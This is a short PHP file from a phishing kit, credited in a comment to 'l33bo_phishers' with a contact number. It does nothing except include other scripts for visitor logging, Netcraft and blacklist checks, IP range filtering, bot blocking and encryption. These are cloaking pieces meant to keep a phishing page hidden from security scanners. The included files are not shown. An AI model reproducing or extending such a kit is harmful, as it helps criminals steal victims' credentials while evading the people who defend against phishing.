<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/visitor_log.php";
require "assets/includes/netcraft_check.php";
require "assets/includes/blacklist_lookup.php";
require "assets/includes/ip_range_check.php";
require "antibots.php";
require "crypt.php";

?>